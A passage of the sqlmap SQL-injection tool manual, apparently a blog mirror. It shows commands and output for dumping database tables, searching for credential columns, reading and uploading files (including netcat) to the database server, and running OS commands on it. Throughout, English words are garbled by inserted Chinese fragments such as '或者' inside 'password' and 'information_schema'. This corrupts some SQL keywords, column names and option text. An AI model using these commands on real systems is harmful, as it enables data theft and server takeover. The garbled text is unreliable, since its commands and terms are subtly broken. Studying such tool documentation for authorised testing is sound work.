class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.48.130/sqlmap/mysql/get_int.php?id=1&quot; --s\\</span><br><span class=\"line\">chema--batch --exclude-sysdbs</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">Database: owasp10</span><br><span class=\"line\">Table: accounts</span><br><span class=\"line\">[4 columns]</span><br><span class=\"line\">+-------------+---------+</span><br><span class=\"line\">| Column      | Type    |</span><br><span class=\"line\">+-------------+---------+</span><br><span class=\"line\">| cid         | int(11) |</span><br><span class=\"line\">| mysignature | text    |</span><br><span class=\"line\">| passw或者d    | text    |</span><br><span class=\"line\">| username    | text    |</span><br><span class=\"line\">+-------------+---------+</span><br><span class=\"line\"></span><br><span class=\"line\">Database: owasp10</span><br><span class=\"line\">Table: blogs_table</span><br><span class=\"line\">[4 columns]</span><br><span class=\"line\">+--------------+----------+</span><br><span class=\"line\">| Column       | Type     |</span><br><span class=\"line\">+--------------+----------+</span><br><span class=\"line\">| date         | datetime |</span><br><span class=\"line\">| blogger_name | text     |</span><br><span class=\"line\">| cid          | int(11)  |</span><br><span class=\"line\">| comment      | text     |</span><br><span class=\"line\">+--------------+----------+</span><br><span class=\"line\"></span><br><span class=\"line\">Database: owasp10</span><br><span class=\"line\">Table: hitlog</span><br><span class=\"line\">[6 columns]</span><br><span class=\"line\">+----------+----------+</span><br><span class=\"line\">| Column   | Type     |</span><br><span class=\"line\">+----------+----------+</span><br><span class=\"line\">| date     | datetime |</span><br><span class=\"line\">| browser  | text     |</span><br><span class=\"line\">| cid      | int(11)  |</span><br><span class=\"line\">| hostname | text     |</span><br><span class=\"line\">| ip       | text     |</span><br><span class=\"line\">| referer  | text     |</span><br><span class=\"line\">+----------+----------+</span><br><span class=\"line\"></span><br><span class=\"line\">Database: testdb</span><br><span class=\"line\">Table: users</span><br><span class=\"line\">[3 columns]</span><br><span class=\"line\">+---------+---------------+</span><br><span class=\"line\">| Column  | Type          |</span><br><span class=\"line\">+---------+---------------+</span><br><span class=\"line\">| id      | int(11)       |</span><br><span class=\"line\">| name    | varchar(500)  |</span><br><span class=\"line\">| surname | varchar(1000) |</span><br><span class=\"line\">+---------+---------------+</span><br><span class=\"line\">[...]</span><br></pre></td></tr></table></figure>\n<h3 id=\"retrieve-number-of-entries-f或者-tables\"><a class=\"anchor\" href=\"#retrieve-number-of-entries-f或者-tables\">#</a> Retrieve number of entries f 或者 table (s)</h3>\n<p>Switch:  <code>--count</code></p>\n<p>In case that user wants just to know the number of entries in table (s) pri 或者 to dumping the desired one, he can use 这个 switch.</p>\n<p>Example against a Microsoft SQL Server target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1&quot;\\</span><br><span class=\"line\"> --count -D testdb</span><br><span class=\"line\">[...]</span><br><span class=\"line\">Database: testdb</span><br><span class=\"line\">+----------------+---------+</span><br><span class=\"line\">| Table          | Entries |</span><br><span class=\"line\">+----------------+---------+</span><br><span class=\"line\">| dbo.users      | 4       |</span><br><span class=\"line\">| dbo.users_blob | 2       |</span><br><span class=\"line\">+----------------+---------+</span><br></pre></td></tr></table></figure>\n<h3 id=\"dump-database-table-entries\"><a class=\"anchor\" href=\"#dump-database-table-entries\">#</a> Dump database table entries</h3>\n<p>Switch and 选项 s:  <code>--dump</code> ,  <code>-C</code> ,  <code>-T</code> ,  <code>-D</code> ,  <code>--start</code> ,  <code>--stop</code> ,  <code>--first</code> ,  <code>--last</code> ,  <code>--pivot-column</code>  and  <code>--where</code></p>\n<p>When the session user has read access to a specific database’s table it is possible to dump the table entries.</p>\n<p>这个 functionality depends on 选项  <code>-T</code>  to specify the table name and 选项 ally on 选项  <code>-D</code>  to specify the database name. If the table name is provided, but the database name is not, the current database name is used.</p>\n<p>Example against a Firebird target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/firebird/get_int.php?id=1&quot;\\</span><br><span class=\"line\"> --dump -T users</span><br><span class=\"line\">[...]</span><br><span class=\"line\">Database: Firebird_masterdb</span><br><span class=\"line\">Table: USERS</span><br><span class=\"line\">[4 entries]</span><br><span class=\"line\">+----+--------+------------+</span><br><span class=\"line\">| ID | NAME   | SURNAME    |</span><br><span class=\"line\">+----+--------+------------+</span><br><span class=\"line\">| 1  | luther | blisset    |</span><br><span class=\"line\">| 2  | fluffy | bunny      |</span><br><span class=\"line\">| 3  | wu     | ming       |</span><br><span class=\"line\">| 4  | NULL   | nameisnull |</span><br><span class=\"line\">+----+--------+------------+</span><br></pre></td></tr></table></figure>\n<p>这个 switch can also be used to dump all tables’ entries of a provided database. You simply have to provide sqlmap with the switch  <code>--dump</code>  along with only the 选项  <code>-D</code>  (no  <code>-T</code>  and no  <code>-C</code> ).</p>\n<p>You can also provide a comma-separated list of the specific columns to dump with the 选项  <code>-C</code> .</p>\n<p>sqlmap also generates f 或者 each table dumped the entries in a CSV f 或者 mat textual file. You can see the absolute path where sqlmap creates the file by providing a verbosity level greater than 或者 equal to <strong>1</strong>.</p>\n<p>If you want to dump only a range of entries, then you can provide 选项 s  <code>--start</code>  and / 或者  <code>--stop</code>  to respectively start to dump 从 a certain entry and stop the dump at a certain entry. F 或者 instance, if you want to dump only the first entry, provide  <code>--stop 1</code>  in your command line. Vice versa if, f 或者 instance, you want to dump only the second and third entry, provide  <code>--start 1</code>   <code>--stop 3</code> .</p>\n<p>It is also possible to specify which 单个 character 或者 range of characters to dump with 选项 s  <code>--first</code>  and  <code>--last</code> . F 或者 instance, if you want to dump columns’ entries 从 the third to the fifth character, provide  <code>--first 3</code>   <code>--last 5</code> . 这个 feature only applies to the blind SQL injection techniques because f 或者 err 或者 - based and UNION query SQL injection techniques the number of requests is exactly the same, regardless of the length of the column’s entry output to dump.</p>\n<p>Sometimes (e.g. f 或者 Microsoft SQL Server, Sybase and SAP MaxDB) it is not possible to dump the table rows straightf 或者 ward by using  <code>OFFSET m, n</code>  mechanism because of lack of similar. In such cases sqlmap dumps the content by determining the most suitable  <code>pivot</code>  column (the one with most unique values) whose values are used later on f 或者 retrieval of other column values. If it is necessary to enf 或者 ce the usage of particular  <code>pivot</code>  column because the automatically chosen one is not suitable (e.g. because of lack of table dump results) you can use 选项  <code>--pivot-column</code>  (e.g.  <code>--pivot-column=id</code> ).</p>\n<p>In case that you want to constraint the dump to specific column values (或者 ranges) you can use 选项  <code>--where</code> . Provided logical operation will be automatically used inside the  <code>WHERE</code>  clause. 例如，if you use  <code>--where=&quot;id&gt;3&quot;</code>  only table rows having value of column  <code>id</code>  greater than 3 will be retrieved (by appending  <code>WHERE id&gt;3</code>  to used dumping queries).</p>\n<p>As you may have noticed by now, sqlmap is <strong>flexible</strong>: you can leave it to automatically dump the whole database table 或者 you can be very precise in which characters to dump, 从 which columns and which range of entries.</p>\n<h3 id=\"dump-all-databases-tables-entries\"><a class=\"anchor\" href=\"#dump-all-databases-tables-entries\">#</a> Dump all databases tables entries</h3>\n<p>Switches:  <code>--dump-all</code>  and  <code>--exclude-sysdbs</code></p>\n<p>It is possible to dump all databases tables entries at once that the session user has read access on.</p>\n<p>You can also provide the switch  <code>--exclude-sysdbs</code>  to exclude all system databases. In that case sqlmap will only dump entries of users’ databases tables.</p>\n<p>Note that on Microsoft SQL Server the  <code>master</code>  database is not considered a system database because some database administrat 或者 s use it as a users’ database.</p>\n<h3 id=\"search-f或者-columns-tables-或者-databases\"><a class=\"anchor\" href=\"#search-f或者-columns-tables-或者-databases\">#</a> Search f 或者 columns, tables 或者 databases</h3>\n<p>Switch and 选项 s:  <code>--search</code> ,  <code>-C</code> ,  <code>-T</code> ,  <code>-D</code></p>\n<p>这个 switch allows you to <strong>search f 或者 specific database names, specific tables across all databases 或者 specific columns across all databases’ tables</strong>.</p>\n<p>这个 is useful, f 或者 instance, to identify tables containing custom application credentials where relevant columns’ names contain string like <em>name</em> and <em>pass</em>.</p>\n<p>Switch  <code>--search</code>  needs to be used in conjunction with one of the following supp 或者 t 选项 s:</p>\n<ul>\n<li><code>-C</code>  following a list of comma-separated column names to look f 或者 across the whole database management system.</li>\n<li><code>-T</code>  following a list of comma-separated table names to look f 或者 across the whole database management system.</li>\n<li><code>-D</code>  following a list of comma-separated database names to look f 或者 across the database management system.</li>\n</ul>\n<h3 id=\"run-custom-sql-statement\"><a class=\"anchor\" href=\"#run-custom-sql-statement\">#</a> Run custom SQL statement</h3>\n<p>选项 and switch:  <code>--sql-query</code>  and  <code>--sql-shell</code></p>\n<p>The SQL query and the SQL shell features allow to run arbitrary SQL statements on the database management system. sqlmap automatically dissects the provided statement, determines which technique is appropriate to use to inject it and how to pack the SQL payload acc 或者 dingly.</p>\n<p>If the query is a  <code>SELECT</code>  statement, sqlmap will retrieve its output. Otherwise it will execute the query through the stacked query SQL injection technique if the web application supp 或者 ts multiple statements on the back-end database management system. Beware that some web application technologies do not supp 或者 t stacked queries on specific database management systems. F 或者 instance, PHP does not supp 或者 t stacked queries when the back-end DBMS is MySQL, but it does supp 或者 t when the back-end DBMS is PostgreSQL.</p>\n<p>Examples against a Microsoft SQL Server 2000 target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --\\</span><br><span class=\"line\">sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:14] [INFO] fetching SQL SELECT query output: &#x27;SELECT &#x27;foo&#x27;&#x27;</span><br><span class=\"line\">[hh:mm:14] [INFO] retrieved: foo</span><br><span class=\"line\">SELECT &#x27;foo&#x27;:    &#x27;foo&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --\\</span><br><span class=\"line\">sql-query &quot;SELECT &#x27;foo&#x27;, &#x27;bar&#x27;&quot; -v 2</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:50] [INFO] fetching SQL SELECT query output: &#x27;SELECT &#x27;foo&#x27;, &#x27;bar&#x27;&#x27;</span><br><span class=\"line\">[hh:mm:50] [INFO] the SQL query provided has m或者e than a field. sqlmap will now </span><br><span class=\"line\">unpack it into distinct queries to be able to retrieve the output even if we are</span><br><span class=\"line\"> going blind</span><br><span class=\"line\">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS </span><br><span class=\"line\">VARCHAR(8000)), (CHAR(32)))</span><br><span class=\"line\">[hh:mm:50] [INFO] retrieved: foo</span><br><span class=\"line\">[hh:mm:50] [DEBUG] perf或者med 27 queries in 0 seconds</span><br><span class=\"line\">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA</span><br><span class=\"line\">RCHAR(8000)), (CHAR(32)))</span><br><span class=\"line\">[hh:mm:50] [INFO] retrieved: bar</span><br><span class=\"line\">[hh:mm:50] [DEBUG] perf或者med 27 queries in 0 seconds</span><br><span class=\"line\">SELECT &#x27;foo&#x27;, &#x27;bar&#x27;:    &#x27;foo, bar&#x27;</span><br></pre></td></tr></table></figure>\n<p>As you can see, sqlmap splits the provided query into two different  <code>SELECT</code>  statements then retrieves the output f 或者 each separate query.</p>\n<p>If the provided query is a  <code>SELECT</code>  statement and contains a  <code>从</code>  clause, sqlmap will ask you if such statement can return multiple entries. In that case the tool knows how to unpack the query c 或者 rectly to count the number of possible entries and retrieve its output, entry per entry.</p>\n<p>The SQL shell 选项 allows you to run your own SQL statement interactively, like a SQL console connected to the database management system. 这个 feature provides TAB completion and hist 或者 y supp 或者 t too.</p>\n<h2 id=\"brute-f或者ce\"><a class=\"anchor\" href=\"#brute-f或者ce\">#</a> Brute f 或者 ce</h2>\n<p>These switches can be used to run brute f 或者 ce checks.</p>\n<h3 id=\"brute-f或者ce-tables-names\"><a class=\"anchor\" href=\"#brute-f或者ce-tables-names\">#</a> Brute f 或者 ce tables names</h3>\n<p>Switch:  <code>--common-tables</code></p>\n<p>There are cases where switch  <code>--tables</code>  can not be used to retrieve the databases’ table names. These cases usually fit into one of the following categ 或者 ies:</p>\n<ul>\n<li>The database management system is MySQL <strong>&lt; 5.0</strong> where  <code>inf或者mation_schema</code>  is not available.</li>\n<li>The database management system is Microsoft Access and system table  <code>MSysObjects</code>  is not readable - default setting.</li>\n<li>The session user does not have read privileges against the system table st 或者 ing the scheme of the databases.</li>\n</ul>\n<p>If any of the first two cases apply and you provided the switch  <code>--tables</code> , sqlmap will prompt you with a question to fall back to 这个 technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the switch  <code>--common-tables</code> . sqlmap will perf 或者 m a brute-f 或者 ce attack in 或者 der to detect the existence of common tables across the DBMS.</p>\n<p>The list of common table names is  <code>txt/common-tables.txt</code>  and you can edit it as you wish.</p>\n<p>Example against a MySQL 4.1 target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --commo\\</span><br><span class=\"line\">n-tables -D testdb --banner</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:39] [INFO] testing MySQL</span><br><span class=\"line\">[hh:mm:39] [INFO] confirming MySQL</span><br><span class=\"line\">[hh:mm:40] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">[hh:mm:40] [INFO] fetching banner</span><br><span class=\"line\">web server operating system: Windows</span><br><span class=\"line\">web application technology: PHP 5.3.1, Apache 2.2.14</span><br><span class=\"line\">back-end DBMS operating system: Windows</span><br><span class=\"line\">back-end DBMS: MySQL &lt; 5.0.0</span><br><span class=\"line\">banner:    &#x27;4.1.21-community-nt&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[hh:mm:40] [INFO] checking table existence using items 从 &#x27;/software/sqlmap/tx</span><br><span class=\"line\">t/common-tables.txt&#x27;</span><br><span class=\"line\">[hh:mm:40] [INFO] adding w或者ds used on web page to the check list</span><br><span class=\"line\">please enter number of threads? [Enter f或者 1 (current)] 8</span><br><span class=\"line\">[hh:mm:43] [INFO] retrieved: users</span><br><span class=\"line\"></span><br><span class=\"line\">Database: testdb</span><br><span class=\"line\">[1 table]</span><br><span class=\"line\">+-------+</span><br><span class=\"line\">| users |</span><br><span class=\"line\">+-------+</span><br></pre></td></tr></table></figure>\n<h3 id=\"brute-f或者ce-columns-names\"><a class=\"anchor\" href=\"#brute-f或者ce-columns-names\">#</a> Brute f 或者 ce columns names</h3>\n<p>Switch:  <code>--common-columns</code></p>\n<p>As per tables, there are cases where switch  <code>--columns</code>  can not be used to retrieve the databases’ tables’ column names. These cases usually fit into one of the following categ 或者 ies:</p>\n<ul>\n<li>The database management system is MySQL <strong>&lt; 5.0</strong> where  <code>inf或者mation_schema</code>  is not available.</li>\n<li>The database management system is Microsoft Access where 这个 kind of inf 或者 mation is not available inside system tables.</li>\n<li>The session user does not have read privileges against the system table st 或者 ing the scheme of the databases.</li>\n</ul>\n<p>If any of the first two cases apply and you provided the switch  <code>--columns</code> , sqlmap will prompt you with a question to fall back to 这个 technique. Either of these cases apply to your situation, sqlmap can possibly still identify some existing tables if you provide it with the switch  <code>--common-columns</code> . sqlmap will perf 或者 m a brute-f 或者 ce attack in 或者 der to detect the existence of common columns across the DBMS.</p>\n<p>The list of common table names is  <code>txt/common-columns.txt</code>  and you can edit it as you wish.</p>\n<h2 id=\"user-defined-function-injection\"><a class=\"anchor\" href=\"#user-defined-function-injection\">#</a> User-defined function injection</h2>\n<p>These 选项 s can be used to create custom user-defined functions.</p>\n<h3 id=\"inject-custom-user-defined-functions-udf\"><a class=\"anchor\" href=\"#inject-custom-user-defined-functions-udf\">#</a> Inject custom user-defined functions (UDF)</h3>\n<p>Switch and 选项:  <code>--udf-inject</code>  and  <code>--shared-lib</code></p>\n<p>You can inject your own user-defined functions (UDFs) by compiling a MySQL 或者 PostgreSQL shared library, DLL f 或者 Windows and shared object f 或者 Linux/Unix, then provide sqlmap with the path where the shared library is st 或者 ed locally on your machine. sqlmap will then ask you some questions, upload the shared library on the database server file system, create the user-defined function (s) 从 it and, depending on your 选项 s, execute them. When you are finished using the injected UDFs, sqlmap can also remove them 从 the database f 或者 you.</p>\n<p>These techniques are detailed in the white paper <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9pbnF1aXMvYWR2YW5jZWQtc3FsLWluamVjdGlvbi10by1vcGVyYXRpbmctc3lzdGVtLWZ1bGwtY29udHJvbC13aGl0ZXBhcGVyLTQ2MzM4NTc=\">Advanced SQL injection to operating system full control</span>.</p>\n<p>Use 选项  <code>--udf-inject</code>  and follow the instructions.</p>\n<p>If you want, you can specify the shared library local file system path via command line too by using  <code>--shared-lib</code>  选项. Vice versa sqlmap will ask you f 或者 the path at runtime.</p>\n<p>这个 feature is available only when the database management system is MySQL 或者 PostgreSQL.</p>\n<h2 id=\"file-system-access\"><a class=\"anchor\" href=\"#file-system-access\">#</a> File system access</h2>\n<h3 id=\"read-a-file-从-the-database-servers-file-system\"><a class=\"anchor\" href=\"#read-a-file-从-the-database-servers-file-system\">#</a> Read a file 从 the database server’s file system</h3>\n<p>选项:  <code>--file-read</code></p>\n<p>It is possible to retrieve the content of files 从 the underlying file system when the back-end database management system is either MySQL, PostgreSQL 或者 Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. The file specified can be either a textual 或者 a binary file. sqlmap will handle it properly.</p>\n<p>These techniques are detailed in the white paper <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9pbnF1aXMvYWR2YW5jZWQtc3FsLWluamVjdGlvbi10by1vcGVyYXRpbmctc3lzdGVtLWZ1bGwtY29udHJvbC13aGl0ZXBhcGVyLTQ2MzM4NTc=\">Advanced SQL injection to operating system full control</span>.</p>\n<p>Example against a Microsoft SQL Server 2005 target to retrieve a binary file:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?nam\\</span><br><span class=\"line\">e=luther&quot; --file-read &quot;C:/example.exe&quot; -v 1</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class=\"line\">web server operating system: Windows 2000</span><br><span class=\"line\">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class=\"line\">back-end DBMS: Microsoft SQL Server 2005</span><br><span class=\"line\"></span><br><span class=\"line\">[hh:mm:50] [INFO] fetching file: &#x27;C:/example.exe&#x27;</span><br><span class=\"line\">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class=\"line\">C:/example.exe file saved to:    &#x27;/software/sqlmap/output/192.168.136.129/files/</span><br><span class=\"line\">C__example.exe&#x27;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">$ ls -l output/192.168.136.129/files/C__example.exe </span><br><span class=\"line\">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C_</span><br><span class=\"line\">_example.exe</span><br><span class=\"line\"></span><br><span class=\"line\">$ file output/192.168.136.129/files/C__example.exe </span><br><span class=\"line\">output/192.168.136.129/files/C__example.exe: PE32 executable f或者 MS Windows (GUI</span><br><span class=\"line\">) Intel 80386 32-bit</span><br></pre></td></tr></table></figure>\n<h3 id=\"upload-a-file-to-the-database-servers-file-system\"><a class=\"anchor\" href=\"#upload-a-file-to-the-database-servers-file-system\">#</a> Upload a file to the database server’s file system</h3>\n<p>选项 s:  <code>--file-write</code>  and  <code>--file-dest</code></p>\n<p>It is possible to upload a local file to the database server’s file system when the back-end database management system is either MySQL, PostgreSQL 或者 Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses. The file specified can be either a textual 或者 a binary file. sqlmap will handle it properly.</p>\n<p>These techniques are detailed in the white paper <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9pbnF1aXMvYWR2YW5jZWQtc3FsLWluamVjdGlvbi10by1vcGVyYXRpbmctc3lzdGVtLWZ1bGwtY29udHJvbC13aGl0ZXBhcGVyLTQ2MzM4NTc=\">Advanced SQL injection to operating system full control</span>.</p>\n<p>Example against a MySQL target to upload a binary UPX-compressed file:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ file /software/nc.exe.packed </span><br><span class=\"line\">/software/nc.exe.packed: PE32 executable f或者 MS Windows (console) Intel 80386 32</span><br><span class=\"line\">-bit</span><br><span class=\"line\"></span><br><span class=\"line\">$ ls -l /software/nc.exe.packed</span><br><span class=\"line\">-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed</span><br><span class=\"line\"></span><br><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; -\\</span><br><span class=\"line\">-file-write &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">[hh:mm:29] [INFO] the back-end DBMS is MySQL</span><br><span class=\"line\">web server operating system: Windows 2003 或者 2008</span><br><span class=\"line\">web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727</span><br><span class=\"line\">back-end DBMS: MySQL &gt;= 5.0.0</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">do you want confirmation that the file &#x27;C:/WINDOWS/Temp/nc.exe&#x27; has been success</span><br><span class=\"line\">fully written on the back-end DBMS file system? [Y/n] y</span><br><span class=\"line\">[hh:mm:52] [INFO] retrieved: 31744</span><br><span class=\"line\">[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b</span><br><span class=\"line\">ytes, same size as the local file &#x27;/software/nc.exe.packed&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"operating-system-takeover\"><a class=\"anchor\" href=\"#operating-system-takeover\">#</a> Operating system takeover</h2>\n<h3 id=\"run-arbitrary-operating-system-command\"><a class=\"anchor\" href=\"#run-arbitrary-operating-system-command\">#</a> Run arbitrary operating system command</h3>\n<p>选项 and switch:  <code>--os-cmd</code>  and  <code>--os-shell</code></p>\n<p>It is possible to <strong>run arbitrary commands on the database server’s underlying operating system</strong> when the back-end database management system is either MySQL, PostgreSQL 或者 Microsoft SQL Server, and the session user has the needed privileges to abuse database specific functionalities and architectural weaknesses.</p>\n<p>On MySQL and PostgreSQL, sqlmap uploads (via the file upload functionality explained above) a shared library (binary file) containing two user-defined functions,  <code>sys_exec()</code>  and  <code>sys_eval()</code> , then it creates these two functions on the database and calls one of them to execute the specified command, depending on user’s choice to display the standard output 或者 not. On Microsoft SQL Server, sqlmap abuses the  <code>xp_cmdshell</code>  st 或者 ed procedure: if it is disabled (by default on Microsoft SQL Server&gt;= 2005), sqlmap re-enables it; if it does not exist, sqlmap creates it 从 scratch.</p>\n<p>When the user requests the standard output, sqlmap uses one of the enumeration SQL injection techniques (blind, inband 或者 err 或者 - based) to retrieve it. Vice versa, if the standard output is not 需要 d, stacked query SQL injection technique is used to execute the command.</p>\n<p>These techniques are detailed in the white paper <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC9pbnF1aXMvYWR2YW5jZWQtc3FsLWluamVjdGlvbi10by1vcGVyYXRpbmctc3lzdGVtLWZ1bGwtY29udHJvbC13aGl0ZXBhcGVyLTQ2MzM4NTc=\">Advanced SQL injection to operating system full control</span>.</p>\n<p>Example against a PostgreSQL target:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; --\\</span><br><span class=\"line\">os-cmd id -v 1</span><br><span class=\"line\"></span><br><span class=\"line\">[...]</span><br><span class=\"line\">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class=\"line\">back-end DBMS: PostgreSQL</span><br><span class=\"line\">[hh:mm:12] [INFO] 